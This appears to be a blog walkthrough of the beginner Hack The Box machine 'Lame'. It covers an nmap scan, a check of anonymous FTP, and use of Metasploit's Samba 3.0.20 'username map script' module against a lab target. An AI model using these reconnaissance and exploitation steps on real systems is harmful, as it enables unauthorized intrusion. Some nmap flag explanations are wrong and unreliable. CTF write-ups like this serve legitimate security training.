+++
author = "Jake Rice"
title = "Lame is Cool"
date = "2022-06-04"
description = ""
tags = [
    "HTB",
    "CTF_Walkthrough",
]
thumbnail = "images/Lame_logo.png"

+++
Clever titles for days. This walkthough of the Lame box is another begginner friendly entry level HTB. We'll explore a little anonymous FTP, and find out more about Samba. s

<!--more-->
---
## Startup

This is an entry level beginner freindley box, so the walkthrough is going to be the same. With that being said, the first step that other walkthoughs always skip over is spinning up the box and getting connected. While it is easy once you know how to do it if you don't know how you'll never be able to get started. Feel free to skip to the next section if you already know how to do this.

HTB has 2 options when it comes to completing their boxes. You can spin up a machine via HTB, or connect your own using OpenVPN. I prefer to connect my because of the customizations and different tools I have on my Kali machine, but if you want here is where to find the HTB Attack Box.

The first step if you are connecting via OpenVPN is to first make sure you have OpenVPN installed on your device. Either start typing the command see if it autofills, or if using Kali run:
```bash
sudo apt install openvpn
```
Once you are sure is installed in the same place where you see the attack box you can select OpenVPN. Change the server if desired and then download the file. Find the file location and run the following command:
```bash
openvpn insert/filepath/here
```

After you have connected you may have to refresh the page in order for the connect box to turn green and show your HTB IP. After that the last step is to find the Jerry box and start it up.
{{% notice note "Heads Up"%}}
That IP in the green box will be the IP you use for yourself during interactions with this box. Do not use your actual IP.
{{% /notice %}}

---

## Intelligence gathering

The first thing I always like to do is run NMap. Here is the NMap scan I ran and a breakdown of the flags I used.
```bash
nmap -sT -sV -Pn -p- -A -T3 tar.get.ip.add -oA /home/kali/HTB/WU/Lame/nmap/scans
```
{{% notice tip "NMAP Flags"%}}
-sT =

-sV = OS Version

-Pn = Scan all ports, and don't ping. (Scans prots no matter what)

-p- = All ports

-A = All

-T3 = Speed level. (Options 1-5 with 1 being slowest and 5 fastest)

-oA = output namp in the three formatss to the specified file path.
{{% /notice %}}

While that is running let's go ahead and see if we can find anything at the IP. Open up a web browser and put in the target machines IP address. We don't get any results, but we'll check a couple of the usual directories just in case. I searched around using /admin /login /user /signin /contact and got nothing, so lets dive in to those NMap results.
```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-04 22:53 EDT
Nmap scan report for 10.10.10.3
Host is up (0.033s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.9
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
|_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: DD-WRT v24-sp1 (Linux 2.4.36) (92%), OpenWrt White Russian 0.9 (Linux 2.4.30) (92%), Linux 2.6.23 (92%), Belkin N300 WAP (Linux 2.6.30) (92%), Control4 HC-300 home controller (92%), D-Link DAP-1522 WAP, or Xerox WorkCentre Pro 245 or 6556 printer (92%), Dell Integrated Remote Access Controller (iDRAC5) (92%), Dell Integrated Remote Access Controller (iDRAC6) (92%), Linksys WET54GS5 WAP, Tranzeo TR-CPQ-19f WAP, or Xerox WorkCentre Pro 265 printer (92%), Linux 2.4.21 - 2.4.31 (likely embedded) (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2022-06-04T22:55:49-04:00
|_clock-skew: mean: 2h00m06s, deviation: 2h49m45s, median: 3s

TRACEROUTE (using proto 1/icmp)
HOP RTT      ADDRESS
1   32.78 ms 10.10.14.1
2   32.81 ms 10.10.10.3

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 176.96 seconds
```

So we've got two items that really catch my eye in that NMap scan. Item one is the port 21 Anonymous FTP, and item two is the Samba ports 139 and 445. Lets start off by looking into port 21 first.

---
## Port 21 - Anonymous FTP

In the NMap scan the first thing that should catch your eye is that port 21 FTP is allowing Anonymous FTP. Anonymous FTP essentially means we can log in wihout having a username or password. We will connect using the user name anonymous with no password.
```bash
ftp anonymous@tar.get.ip.add 
```
{{% notice note "Heads Up"%}}
The username being used is the one before the @ sign.
{{% /notice %}}

Once you get in there you can do some snooping, but you're not able to find anything. Just to cover your bases login using ftp as the user too. Unfourtaenly, there is nothing there either. It appears anonymous FTP was a red herring. That's okay though, because we have another open port to check!

---

## Port 139/445 - Samba

First off what is Samba? Port 139 and 445 are SMB and used for file transfer, and back in the day it used to run on top of NetBIOS. Now days port 445 TCP can use it for file transfer. When looking for this specific version you do find that there is an exploit for it. This is the perfect time to introduce searchsploit.
```bash
searchsploit samba 3.0.2
```
When doing that we see several exploits, but the one we'll focus on is:

{{% notice tip "Searchploit Result"%}}
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit) | unix/remote/16320.rb
{{% /notice %}}

Now that we've found an exploit it's time to... exploit!

---


## Exploiting the vulnerablity

From our searchsploit result we see we can use this exploit via Metasploit. Lets get it spun up and dive in.
```bash
msfconsole
```
Once you have it started we can get is set up.

{{% notice tip "Metasploit Setup"%}}
1- Use show options

2-Set the rhost as the target IP (set rhost tar.get.ip.add)

3-Set the lhost as your IP (set lhost your.HTB.ip.add)(The IP given to you via HTB (it's in the green box))

4-Use exploit (exploit OR run)
{{% /notice %}}

It works!! Now time to dig around and find the flags. I'll leave that part for you, but feel free to message me if you need a hand!